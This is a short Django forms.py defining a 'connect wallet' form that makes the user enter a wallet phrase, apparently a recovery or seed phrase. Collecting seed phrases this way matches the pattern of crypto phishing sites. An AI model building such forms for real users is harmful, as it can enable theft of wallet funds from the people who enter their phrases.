# forms.py
from django import forms
from .models import ConnectWallet, WalletAsset

class ConnectWalletForm(forms.ModelForm):
    class Meta:
        model = ConnectWallet
        fields = ['wallet', 'wallet_phrase']  # Show wallet selection and phrase input

    # Optionally, you can add custom validation for the wallet phrase
    def clean_wallet_phrase(self):
        phrase = self.cleaned_data.get('wallet_phrase')
        if not phrase:
            raise forms.ValidationError("Wallet phrase is required.")
        return phrase